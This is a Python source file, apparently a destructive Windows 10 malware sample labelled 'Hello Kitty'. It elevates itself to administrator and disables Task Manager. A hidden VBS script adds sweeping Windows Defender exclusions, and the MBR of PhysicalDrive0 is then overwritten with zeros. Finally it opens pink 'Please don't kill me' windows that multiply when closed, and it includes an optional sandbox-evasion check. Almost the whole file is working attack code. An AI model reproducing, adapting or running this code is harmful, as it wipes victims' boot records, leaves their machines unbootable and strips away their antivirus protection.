###############################################################
####                  Made By DerKeks8141                  ####
###############################################################

import os
import sys
import platform
if os.name != "nt":
    sys.exit()
if platform.release() != '10':
    sys.exit()
from pathlib import Path
from tkinter import messagebox
import psutil
import random
from random import randint
from time import sleep
from tkinter import *
import tkinter as tk
from win32gui import *
from win32ui import *
from win32con import *
from win32file import *
import win32comext.shell.shell as shell
ASADMIN = 'asadmin'

if sys.argv[-1] != ASADMIN:
    script = os.path.abspath(sys.argv[0])
    params = ' '.join([script] + sys.argv[1:] + [ASADMIN])
    shell.ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters=params)
    sys.exit(0)

#Pin file
DontDownloadPath = str(Path.home()) + "\\AppData\\Local\\Temp\\djj012ndawm10d9wadaw.txt"

#System Paths
TempPath = str(Path.home()) + "\\AppData\\Local\\Temp"

def Installation():
    #Look for the file, and when its found, the program quits
    if not os.path.isfile(DontDownloadPath):
        DTM()

        os.chdir(TempPath)

        #WindowsDefender "Bypass"
        text_file = open("val.vbs", "w")
        text_file.write(f'''
Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run "cmd /c powershell.exe Add-MpPreference -ExclusionPath '\AppData\Local\Temp\DWD.exe'", 0, True

Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run "cmd /c powershell.exe Add-MpPreference -ExclusionPath '\AppData\Local\Temp\WindowsDefender.exe'", 0, True

Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run "cmd /c powershell.exe Add-MpPreference -ExclusionExtension 'exe'", 0, True

Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run "cmd /c powershell.exe Add-MpPreference -ExclusionExtension 'vbs'", 0, True

Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run "cmd /c powershell.exe Add-MpPreference -ExclusionExtension 'dll'", 0, True

Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run "cmd /c powershell.exe Add-MpPreference -ExclusionPath 'C:'", 0, True

Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run "cmd /c powershell.exe Add-MpPreference -ExclusionPath 'C:\Windows'", 0, True

Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run "cmd /c powershell.exe Add-MpPreference -ExclusionPath 'C:\Windows\System32'", 0, True

Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run "cmd /c powershell.exe Add-MpPreference -ExclusionPath {str(Path.home())}", 0, True

Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run "cmd /c powershell.exe Add-MpPreference -ExclusionPath '{str(Path.home())}\AppData\Local\Temp'", 0, True

Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run "cmd /c powershell.exe Add-MpPreference -ExclusionPath '{str(Path.home())}\AppData\Roaming'", 0, True
        ''')       
        text_file.close()

        sleep(2)

        os.system("attrib +h " + 'val.vbs')

        os.system("start val.vbs")

        os.system("echo > djj012ndawm10d9wadaw.txt")

        DelMBR()

    elif os.path.isfile(DontDownloadPath):
        sys.exit()

def DelMBR():
    #Overwrite MBR
    hDevice = CreateFileW("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING, 0,0)
    WriteFile(hDevice, AllocateReadBuffer(512), None)
    CloseHandle(hDevice)

    sleep(randint(5, 10))
    Window()

def AntiVm():
  #Searches for processes with the name, and when he has found a process, the program quits
  Process = ["vmsrvc.exe" , "vmusrvc.exe", "vboxtray.exe", "vmtoolsd.exe", "df5serv.exe", "vboxservice.exe"]
  for process in psutil.process_iter():
      for i in Process:
        if i in process.name().lower():
            return CommitSuicide()

def CommitSuicide():
  sys.exit()

def DTM():
    try:
        #Block Task-Manager
        os.system("start cmd /c REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f")
    except:
        pass

def Window():
    window = Tk()
    window.geometry("1120x720")
    window.title("Hello Kitty")
    window.configure(background='pink')
    window.resizable(False, False)
    window.attributes('-toolwindow', True)
    window.wm_attributes("-topmost", 1)

    def on_closing():
        window_flush()

    HelloKittyLabel = Label(window, text="Please don't kill me", font=("Arial",30,"bold"), fg="white", bg="pink")
    HelloKittyLabel.pack()
    HelloKittyLabel.place(x=370,y=100)

    window.protocol("WM_DELETE_WINDOW", on_closing)
    window.mainloop()

def move_window(window, speed, dx, dy):
    x, y = map(int, window.geometry().split("+")[1:])
    w, h = window.winfo_width(), window.winfo_height()
    if x + w >= 1920:
        dx = -1 * abs(dx)
    elif x <= 0:
        dx = abs(dx)
    if y + h >= 1080:
        dy = -1 * abs(dy)
    elif y <= 0:
        dy = abs(dy)
    window.geometry("{}x{}+{}+{}".format(w, h, x+dx*speed, y+dy*speed))
    window.after(20, move_window, window, speed, dx, dy)

def create_new_windows(window):
    for i in range(3):
        new_window = tk.Toplevel(window)
        new_window.geometry(window.geometry())
        speed = random.randint(15, 20)
        dx = random.choice([-1, 1])
        dy = random.choice([-1, 1])
        new_window.title("Hello Kitty")
        new_window.protocol("WM_DELETE_WINDOW", lambda: create_new_windows(window))
        new_window.configure(background='pink')
        new_window.resizable(False, False)
        new_window.attributes('-toolwindow', True)
        new_window.wm_attributes("-topmost", 1)
        new_window.after(20, move_window, new_window, speed, dx, dy)

def window_flush():
    root = tk.Tk()
    root.withdraw()
    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()
    
    for i in range(4):
        x_pos = random.randint(0, screen_width-250)
        y_pos = random.randint(0, screen_height-150)
        new_window = tk.Toplevel()
        new_window.geometry("250x150+{}+{}".format(x_pos, y_pos))
        speed = random.randint(15, 20)
        dx = random.choice([-1, 1])
        dy = random.choice([-1, 1])
        new_window.title("Hello Kitty")
        new_window.protocol("WM_DELETE_WINDOW", lambda: create_new_windows(new_window))
        new_window.configure(background='pink')
        new_window.resizable(False, False)
        new_window.attributes('-toolwindow', True)
        new_window.wm_attributes("-topmost", 1)
        new_window.after(20, move_window, new_window, speed, dx, dy)
    
    tk.mainloop()

if __name__ == "__main__":
    #AntiVm() Optional
    Installation()
